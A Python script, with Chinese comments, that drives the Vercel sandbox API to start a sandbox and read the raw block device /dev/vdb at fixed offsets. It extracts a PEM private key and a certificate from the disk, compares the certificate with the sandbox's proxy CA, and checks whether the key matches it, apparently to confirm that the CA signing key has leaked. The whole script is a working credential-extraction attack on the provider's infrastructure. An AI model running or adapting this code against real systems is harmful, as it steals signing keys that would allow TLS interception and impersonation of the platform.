# 实验J132: KEY1@45752332 私钥 + ANCHOR@88118228 证书 精确验证 — 输出精简防截断
# 结论写文件再分段读; 私钥/证书匹配则实锤 ca-key.pem
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=120, args=None):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj132"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

VERIFY = r"""
import os, subprocess, hashlib

LOG = open("/root/verify.log", "w")
def log(*a):
    s = " ".join(str(x) for x in a)
    print(s, flush=True)
    LOG.write(s + "\n")
    LOG.flush()

def sh(cmd):
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.returncode, r.stdout, r.stderr

# [1] 提取精确块: KEY1@45752332, ANCHOR@88118228 (+沙箱CA对比)
f = open("/dev/vdb", "rb", buffering=0)

def extract_at(off, name, back=16384, fwd=16384):
    f.seek(max(0, off - back))
    data = f.read(back + fwd)
    s = data.find(b"-----BEGIN")
    if s < 0:
        return None
    e = data.find(b"-----END", s)
    if e < 0:
        return None
    e = data.find(b"-----", e) + 5
    blk = data[s:e]
    fn = "/root/%s.pem" % name
    open(fn, "wb").write(blk)
    return fn, blk

r1 = extract_at(45752332, "key1")
r2 = extract_at(88118228, "anchor")
f.close()

log("KEY1:", "extracted" if r1 else "FAIL", len(r1[1]) if r1 else 0)
log("ANCHOR:", "extracted" if r2 else "FAIL", len(r2[1]) if r2 else 0)

if r1:
    rc, so, se = sh(["openssl", "pkey", "-in", r1[0], "-noout", "-text"])
    log("KEY1 openssl pkey rc:", rc)
    if rc == 0:
        log(so[:800])
    else:
        log("ERR:", se[:300])
        log("HEAD:", r1[1][:200])

if r2:
    rc, so, se = sh(["openssl", "x509", "-in", r2[0], "-noout", "-subject", "-issuer", "-dates", "-fingerprint"])
    log("ANCHOR openssl x509 rc:", rc)
    if rc == 0:
        log(so)
    else:
        log("ERR:", se[:300])
        log("HEAD:", r2[1][:200])

# [2] 沙箱内 CA 证书参考
ref = None
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        ref = (p, d)
        break
    except Exception:
        pass
if ref:
    p, d = ref
    log("SANDBOX_CA:", p, len(d), "sha256=" + hashlib.sha256(d).hexdigest())
    if r2:
        log("ANCHOR_sha256:", hashlib.sha256(r2[1]).hexdigest())
        log("ANCHOR_MATCH_SANDBOX_CA:", r2[1].strip() == d.strip())

# [3] 私钥公钥 vs 证书公钥
if r1 and r2:
    rc1, pub1, _ = sh(["openssl", "pkey", "-in", r1[0], "-pubout"])
    rc2, pub2, _ = sh(["openssl", "x509", "-in", r2[0], "-pubkey", "-noout"])
    log("KEY1_pubout rc:", rc1, "ANCHOR_pubkey rc:", rc2)
    if rc1 == 0 and rc2 == 0:
        m = pub1.strip() == pub2.strip()
        log("PUBKEY_MATCH:", m)
        if m:
            log("*** CA_KEY_CONFIRMED: vdb@45752332 私钥 == vdb@88118228 CA 证书 ***")
    if rc1 == 0:
        log("KEY1_PUBKEY:")
        log(pub1)

# [4] 附近区域: 45752332 块的前后文 (看是否为配置文件)
f = open("/dev/vdb", "rb", buffering=0)
f.seek(max(0, 45752332 - 8192))
ctx = f.read(16384)
f.close()
log("CTX_45752332_HEAD:", repr(ctx[:500]))

# 输出文件供分片读取
LOG.close()
print("VERIFY_DONE", flush=True)
"""
run_cmd(sid, VERIFY, "verify")

# 分段读日志
for i in range(3):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "sh", "args": ["-c", "sed -n '%d,%dp' /root/verify.log" % (i * 40 + 1, (i + 1) * 40)],
                "wait": True, "logs": True, "timeout": 120})
    print(f"\n== log part {i} ==", flush=True)
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
        except Exception:
            print(line[:300], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
